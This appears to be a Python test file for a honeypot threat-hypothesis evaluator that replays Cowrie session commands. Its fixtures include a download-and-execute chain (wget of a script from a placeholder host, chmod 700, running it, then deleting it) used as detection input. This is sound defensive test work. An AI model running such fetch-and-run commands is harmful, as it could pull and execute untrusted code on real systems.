"""Offline replay of candidate chains against the real typed parser/selector."""

from __future__ import annotations

from research.threat_hypothesis_expansion_20260928.candidate import evaluate_candidate
from tests.test_cross_family_relationship_evaluation import _build
from tests.test_transfer_family_independent_evaluation import _evaluate


def _replay(case_id: str, events: list[tuple[str, str]]) -> tuple[dict, dict]:
    facts, report = _build({"case_id": case_id, "events": events})
    return evaluate_candidate(facts), report


def test_file_preparation_creates_only_bounded_alternatives() -> None:
    candidate, report = _replay("file-preparation", [
        ("printf demo > /tmp/demo.sh", "success"),
        ("chmod 700 /tmp/demo.sh", "success"),
    ])
    assert [item["kind"] for item in candidate["hypotheses"]] == [
        "file_preparation_without_execution"
    ]
    item = candidate["hypotheses"][0]
    assert len(item["alternatives"]) == 2
    assert len(item["fact_refs"]) == 2
    assert len(item["relationship_refs"]) == 1
    assert item["evidence_gap"].startswith("No supported execution")
    assert len(report["hypothesis_sets"]) == 1
    assert [action["kind"] for action in candidate["guidance"]] == ["file_change_review"]
    assert len(candidate["guidance"][0]["fact_refs"]) == 2
    assert all(action["requires_manual_approval"] for action in candidate["guidance"])
    assert all(not action["safe_to_auto_execute"] for action in candidate["guidance"])
    assert all(action["why_selected"] and action["review_sources"]
               and action["confirming_evidence"] and action["disconfirming_evidence"]
               for action in candidate["guidance"])
    assert candidate["authority"]["may_create_canonical_findings"] is False


def test_transfer_then_execution_preserves_unknown_transfer_outcome() -> None:
    candidate, report = _replay("unconfirmed-transfer-execution", [
        ("wget https://example.invalid/demo.sh -O /tmp/demo.sh", "success"),
        ("/tmp/demo.sh", "success"),
    ])
    assert [item["kind"] for item in candidate["hypotheses"]] == [
        "execution_after_unconfirmed_transfer"
    ]
    assert "No direct Cowrie transfer observation" in candidate["hypotheses"][0]["evidence_gap"]
    assert len(report["hypothesis_sets"]) == 1


def test_complete_existing_chain_does_not_create_competing_candidate() -> None:
    candidate, report = _replay("existing-complete-chain", [
        ("wget https://example.invalid/demo.sh -O /tmp/demo.sh", "success"),
        ("chmod 700 /tmp/demo.sh", "success"),
        ("/tmp/demo.sh", "success"),
    ])
    assert candidate["hypotheses"] == []
    assert any(item["finding_type"] == "connected_transfer_permission_execution"
               for item in report["behavioral_findings"])


def test_existing_incomplete_chain_keeps_its_single_hypothesis_set() -> None:
    candidate, report = _replay("existing-incomplete-chain", [
        ("wget https://example.invalid/demo.sh -O /tmp/demo.sh", "success"),
        ("printf demo > /tmp/demo.sh", "success"),
        ("chmod 700 /tmp/demo.sh", "success"),
    ])
    assert candidate["hypotheses"] == []
    assert len(report["hypothesis_sets"]) == 1


def test_direct_transfer_event_suppresses_unconfirmed_transfer_hypothesis() -> None:
    _payload, facts, _selection, report = _evaluate({
        "case_id": "direct-transfer-with-execution",
        "events": [
            {"kind": "command", "command": "wget https://example.invalid/demo.sh -O /tmp/demo.sh", "outcome": "success"},
            {"kind": "transfer", "eventid": "cowrie.session.file_download", "path": "/tmp/demo.sh",
             "url": "https://example.invalid/demo.sh", "digest": "a" * 64},
            {"kind": "command", "command": "/tmp/demo.sh", "outcome": "success"},
        ],
    })
    assert evaluate_candidate(facts)["hypotheses"] == []
    assert any(item["finding_type"] == "observed_cowrie_transfer_event"
               for item in report["behavioral_findings"])


def test_execution_then_delete_yields_review_guidance_without_intent_claim() -> None:
    candidate, report = _replay("execution-delete", [
        ("/tmp/demo.sh", "success"),
        ("rm /tmp/demo.sh", "success"),
    ])
    assert candidate["hypotheses"] == []
    lifecycle = [item for item in candidate["guidance"]
                 if item["kind"] == "file_lifecycle_review"]
    assert len(lifecycle) == 1
    assert len(lifecycle[0]["relationship_refs"]) == 1
    assert "do not establish cleanup intent" in lifecycle[0]["description"]
    assert report["hypothesis_sets"] == []


def test_wrong_path_reversed_and_failed_sequences_do_not_create_hypotheses() -> None:
    cases = [
        [("printf demo > /tmp/demo.sh", "success"),
         ("chmod 700 /tmp/other.sh", "success")],
        [("chmod 700 /tmp/demo.sh", "success"),
         ("printf demo > /tmp/demo.sh", "success")],
        [("printf demo > /tmp/demo.sh", "failure"),
         ("chmod 700 /tmp/demo.sh", "success")],
        [("wget https://example.invalid/demo.sh -O /tmp/demo.sh", "failure"),
         ("/tmp/demo.sh", "success")],
        [("wget https://example.invalid/demo.sh -O /tmp/demo.sh", "success"),
         ("/tmp/other.sh", "success")],
    ]
    for index, events in enumerate(cases):
        candidate, _report = _replay(f"negative-{index}", events)
        assert candidate["hypotheses"] == [], index


def test_output_is_deterministic_and_never_copies_raw_commands() -> None:
    facts, _report = _build({"case_id": "determinism", "events": [
        ("printf demo > /tmp/demo.sh", "success"),
        ("chmod 700 /tmp/demo.sh", "success"),
    ]})
    first = evaluate_candidate(facts)
    assert first == evaluate_candidate(facts)
    assert "/tmp/demo.sh" not in str(first)
    assert "printf demo" not in str(first)
